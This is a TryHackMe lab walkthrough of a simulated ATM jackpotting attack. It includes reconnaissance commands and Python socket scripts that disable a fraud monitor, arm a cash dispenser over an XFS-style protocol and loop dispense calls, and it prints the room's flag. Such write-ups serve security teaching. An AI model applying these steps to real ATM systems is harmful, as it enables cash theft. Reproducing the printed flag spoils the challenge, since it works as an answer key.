# Jackpot TryHackMe Walkthrough

**Author:** Sharat S Unnithan  
**Room:** Jackpot (TryHackMe)  
**Difficulty:** Medium  
**Target:** 10.48.163.128

---

## Table of Contents

1. Introduction
2. Reconnaissance
3. Engineering Console Enumeration
4. Deriving the Supervisor Code
5. Speaking the XFS Bridge Protocol
6. Disabling the Fraud Monitor and Arming
7. Emptying the Cassettes
8. Retrieving the Flag
9. Summary
10. Lessons Learned

---

## 1. Introduction

Jackpot is a TryHackMe room that simulates an ATM jackpotting attack. A branch ATM at "Earth's National Bank" exposes a maintenance interface that was meant only for engineers on the branch LAN, but was left reachable. The cash dispenser speaks a custom XFS (eXtensions for Financial Services) bridge protocol with no meaningful authentication.

The objective is to learn how the ATM software talks to the cash dispenser hardware and convince it to empty every cassette, releasing the flag. This mirrors real-world ATM malware families such as Ploutus and Alice, which bypass the card/PIN transaction layer entirely and issue dispense commands directly to the XFS middleware.

The room hint states: "No card. No PIN. No transaction. Teach the machine to empty itself."

---

## 2. Reconnaissance

### 2.1 Nmap Scan

```bash
nmap -sC -sV 10.48.163.128
```

Output:

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http       BaseHTTPServer 0.6 (Python 3.12.3)
|_http-title: Earth's National Bank — Terminal 004 Engineering Console
|_http-server-header: BaseHTTP/0.6 Python/3.12.3
9100/tcp open  jetdirect?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Key findings:

- Port 22: SSH (not the intended path)
- Port 8080: Python HTTP service hosting the engineering console
- Port 9100: The cash dispenser's raw TCP protocol endpoint

### 2.2 Web Service Browsing

Navigate to `http://10.48.163.128:8080/`. The page shows:

- A live terminal status panel with a session code (nonce)
- Cassette levels for four denominations: $10, $20, $50, $100
- A download link at `/jackpot` for the terminal service tool
- A note stating the service tool derives a supervisor activation code from the session code

---

## 3. Engineering Console Enumeration

### 3.1 Fetching the Status JSON

The page polls a `/status` endpoint every 700ms. Query it directly:

```bash
curl -s http://10.48.163.128:8080/status | python3 -m json.tool
```

Example response:

```json
{
  "nonce": "351880",
  "armed": false,
  "monitor_on": true,
  "locked": false,
  "lock_remaining": 0,
  "screen": "INSERT CARD",
  "dispensed_total": 0,
  "remaining_notes": 280,
  "vault_total_notes": 280,
  "cassettes": [
    {"id": "CST1", "denom": 10, "count": 100},
    {"id": "CST2", "denom": 20, "count": 80},
    {"id": "CST3", "denom": 50, "count": 60},
    {"id": "CST4", "denom": 100, "count": 40}
  ],
  "flag_released": false
}
```

The field `nonce` is the six-digit session code shown on the ATM screen. Note it down.

### 3.2 Downloading the Service Tool

```bash
wget http://10.48.163.128:8080/jackpot
chmod +x jackpot
```

The tool is a small Python or compiled binary. Running it without arguments shows usage:

```
Earth's National Bank - Terminal Engineering Tool
usage: ./jackpot <6-digit session code from ATM screen>
```

---

## 4. Deriving the Supervisor Code

Run the tool with the current nonce:

```bash
./jackpot 351880
```

Output:

```
[*] session nonce : 351880
[*] activation code: 80228513
```

The activation code is the supervisor code used to unlock privileged commands on the dispenser. Each session nonce produces a different code.

---

## 5. Speaking the XFS Bridge Protocol

### 5.1 Connecting to the Dispenser

```bash
nc -w 3 10.48.163.128 9100
```

The service returns a banner describing the protocol:

```json
{
  "service": "Branch Engineering Gateway",
  "protocol": "XFS bridge",
  "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data",
  "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)",
  "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"},
  "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"
}
```

### 5.2 Querying Capabilities

Netcat cannot frame binary data cleanly, so use a Python script:

```python
import socket
import struct

def recv_frame(s):
    lb = s.recv(2)
    if len(lb) < 2:
        return None
    n = struct.unpack(">H", lb)[0]
    d = b""
    while len(d) < n:
        c = s.recv(n - len(d))
        if not c:
            break
        d += c
    return d

s = socket.socket()
s.settimeout(5)
s.connect(("10.48.163.128", 9100))

# Read banner
try:
    s.settimeout(2)
    s.recv(8192)
except:
    pass
s.settimeout(5)

# GETINFO for command 0x0304 (WFS_INF_CDM_CAPABILITIES)
s.send(bytes([0x01]) + struct.pack(">I", 0x0304) + struct.pack(">H", 0))
print(recv_frame(s).decode())
s.close()
```

Response:

```json
{
  "rc": "WFS_SUCCESS",
  "interface": "Branch Engineering Gateway (XFS bridge)",
  "device_class": "CDM",
  "commands": {
    "WFS_INF_CDM_STATUS": "0x301",
    "WFS_INF_CDM_CASH_UNIT_INFO": "0x303",
    "WFS_INF_CDM_CAPABILITIES": "0x304",
    "WFS_CMD_CDM_DISPENSE": "0x401",
    "WFS_CMD_CDM_ARM": "0x4f0",
    "WFS_CMD_CDM_SET_MONITOR": "0x4f1",
    "WFS_CMD_CDM_GET_FLAG": "0x4ff"
  },
  "max_dispense": 40
}
```

The command table reveals the full attack surface. The `max_dispense` value of 40 means each dispense call can only eject 40 notes, so emptying 280 notes requires seven calls.

---

## 6. Disabling the Fraud Monitor and Arming

### 6.1 The Attack Sequence

The intended sequence is:

1. Disable the fraud monitor with `WFS_CMD_CDM_SET_MONITOR` (0x4f1)
2. Arm the dispenser with `WFS_CMD_CDM_ARM` (0x4f0) using the supervisor code
3. Dispense notes with `WFS_CMD_CDM_DISPENSE` (0x401) repeatedly
4. Retrieve the flag with `WFS_CMD_CDM_GET_FLAG` (0x4ff)

### 6.2 Helper Functions

```python
import socket, struct, json

def recv_frame(s):
    lb = s.recv(2)
    if len(lb) < 2:
        return None
    n = struct.unpack(">H", lb)[0]
    d = b""
    while len(d) < n:
        c = s.recv(n - len(d))
        if not c:
            break
        d += c
    return d

def send_cmd(s, msg_type, cmd_id, payload=b""):
    if isinstance(payload, dict):
        payload = json.dumps(payload).encode()
    elif isinstance(payload, str):
        payload = payload.encode()
    req = bytes([msg_type]) + struct.pack(">I", cmd_id) + struct.pack(">H", len(payload)) + payload
    s.send(req)
    resp = recv_frame(s)
    return json.loads(resp.decode()) if resp else None
```

### 6.3 Disable the Monitor

```python
send_cmd(s, 0x02, 0x4f1, {"monitor": False})
```

Response:

```json
{"rc": "WFS_SUCCESS", "monitor_on": false}
```

### 6.4 Arm the Dispenser

```python
send_cmd(s, 0x02, 0x4f0, {"code": 80228513})
```

Response:

```json
{"rc": "WFS_SUCCESS", "armed": true}
```

If the activation code is wrong, the response is:

```json
{"rc": "WFS_ERR_CDM_INVALIDCODE", "detail": "invalid activation code"}
```

---

## 7. Emptying the Cassettes

### 7.1 Dispense Loop

```python
for i in range(10):
    r = send_cmd(s, 0x02, 0x401, {"count": 40})
    if r.get("rc") != "WFS_SUCCESS":
        break
```

Each successful dispense ejects 40 notes. After seven calls, all 280 notes are out and subsequent calls return:

```json
{"rc": "WFS_ERR_CDM_CASHUNITERROR", "detail": "vault empty"}
```

### 7.2 Verifying via the Console

```bash
curl -s http://10.48.163.128:8080/status | python3 -m json.tool
```

Key fields after the attack:

```
"armed": true
"monitor_on": false
"dispensed_total": 280
"remaining_notes": 0
"cassettes": all count = 0
"flag_released": true
```

All four cassettes are empty, the vault is drained, and the flag has been released.

---

## 8. Retrieving the Flag

### 8.1 Via the Protocol

```python
r = send_cmd(s, 0x02, 0x4ff, {})
print(r["flag"])
```

Response:

```json
{
  "rc": "WFS_SUCCESS",
  "flag": "THM{n0_card_n0_pin_just_the_wr0ng_v0ice_speaking_XFS}"
}
```

### 8.2 Via the Console

Load `http://10.48.163.128:8080/` in a browser. When `flag_released` is true, the green flag box on the page displays the flag.

### 8.3 Flag

```
THM{n0_card_n0_pin_just_the_wr0ng_v0ice_speaking_XFS}
```

The flag text references the physical-security adage about bypassing authentication ("no card, no PIN, just the wrong voice") applied to the XFS protocol used by real ATM middleware.

---

## 9. Summary

| Step | Action | Details |
|------|--------|---------|
| 1 | Recon | Nmap reveals ports 8080 (console) and 9100 (XFS bridge) |
| 2 | Get Nonce | Read `/status` JSON to obtain the 6-digit session code |
| 3 | Derive Code | Run `./jackpot <nonce>` to compute the supervisor activation code |
| 4 | Query Capabilities | `GETINFO 0x0304` returns the full command table and `max_dispense` |
| 5 | Disable Monitor | `EXECUTE 0x4f1 {"monitor": false}` |
| 6 | Arm | `EXECUTE 0x4f0 {"code": <supervisor_code>}` |
| 7 | Dispense | `EXECUTE 0x401 {"count": 40}` repeated until the vault is empty |
| 8 | Get Flag | `EXECUTE 0x4ff {}` returns the flag |

Complete Flag:

```
THM{n0_card_n0_pin_just_the_wr0ng_v0ice_speaking_XFS}
```

---

## 10. Lessons Learned

1. **Physical interfaces exposed to the network are critical risks.** The maintenance console was intended for branch-LAN engineers only but was reachable from the network. Real ATM jackpotting attacks often begin with physical access or a misconfigured management interface.

2. **Weak authentication on hardware protocols enables direct hardware control.** The XFS bridge had no authentication beyond a session-derived activation code. Once that code is derived, every command including `DISPENSE` is available.

3. **Transaction-layer controls are bypassed by direct hardware commands.** Cards, PINs, and transaction logs are irrelevant when an attacker can speak the dispenser's native protocol. This is the core insight behind Ploutus and similar ATM malware families.

4. **Capability enumeration reveals the entire attack surface.** The `WFS_INF_CDM_CAPABILITIES` call listed every command including a dedicated `GET_FLAG` shortcut, showing that the challenge rewards querying the protocol before attacking.

5. **Rate limits are often the only remaining obstacle.** The `max_dispense: 40` limit forced multiple dispense calls to empty 280 notes. In real attacks, similar limits are bypassed with loops or by targeting specific cassettes.

6. **Session-derived tokens are predictable.** The supervisor activation code was deterministically derived from the session nonce by a publicly downloadable tool. Any scheme where the secret is computed from a public value with a known algorithm is trivially broken.

---

**End of Walkthrough**

**Author:** Sharat S Unnithan
